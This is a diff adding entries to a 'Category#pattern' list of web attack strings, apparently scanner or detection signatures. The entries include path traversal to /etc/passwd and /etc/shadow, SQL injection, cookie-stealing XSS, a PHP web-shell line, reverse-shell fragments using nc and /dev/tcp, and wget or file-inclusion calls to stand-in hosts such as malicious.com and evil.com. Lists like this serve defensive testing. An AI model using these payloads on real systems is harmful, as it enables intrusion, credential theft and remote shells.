@@ -1,2 +1,45 @@
 whois_raw.cgi#whois_raw.cgi?fqdn=%0acat%20/etc/passwd
 faxsurvey#faxsurvey?/bin/cat%20/etc/passwd
+File Inclusion#../../../../etc/passwd
+Remote Command Execution#;wget http://malicious.com
+SQL Injection#UNION SELECT
+SQL Injection#SELECT * FROM users WHERE username = 'admin' --
+XSS#<script>alert('XSS')</script>
+XSS#<img src=x onerror=alert('XSS')>
+Local File Disclosure#file:///etc/passwd
+Command Injection#; nc -e /bin/sh
+Remote Code Execution#<?php system($_GET['cmd']); ?>
+SQL Injection#1' OR '1'='1
+SQL Injection#' OR 1=1 --
+Directory Traversal#../etc/passwd
+Path Traversal#../../../../../../etc/shadow
+LDAP Injection#*)(|(cn=*)
+SQL Injection#xp_cmdshell
+Shell Injection#| /bin/bash -i >& /dev/tcp/
+Remote File Inclusion#http://malicious.com/shell.txt
+SQL Injection#' UNION SELECT null, version() --
+XSS#<body onload=alert('XSS')>
+Command Injection#`wget http://malicious.com`
+SQL Injection#UNION ALL SELECT
+XSS#<iframe src=javascript:alert('XSS')>
+Command Injection#| nc -e /bin/bash
+SQL Injection#' AND 1=1 --
+XSS#<link rel=stylesheet href=javascript:alert('XSS')>
+Remote File Inclusion#http://example.com/shell.txt?
+SQL Injection#1' AND '1'='1
+XSS#<script>alert(document.cookie)</script>
+Command Injection#; /bin/bash -c
+SQL Injection#; EXEC xp_cmdshell
+Path Traversal#../../../windows/system32/cmd.exe
+LDAP Injection#*)(objectClass=*
+SQL Injection#UNION SELECT NULL, NULL
+Shell Injection#| bash -i >& /dev/tcp/
+Remote File Inclusion#http://example.com/shell.php
+SQL Injection#' OR 'a'='a
+XSS#<style>@import'javascript:alert('XSS')'</style>
+Command Injection#; /bin/bash -i > /dev/tcp/
+SQL Injection#' OR ''='
+XSS#<img src="javascript:alert('XSS')">
+Remote File Inclusion#http://evil.com/shell.pl
+SQL Injection#OR 1=1
+XSS#<svg onload=alert('XSS')>
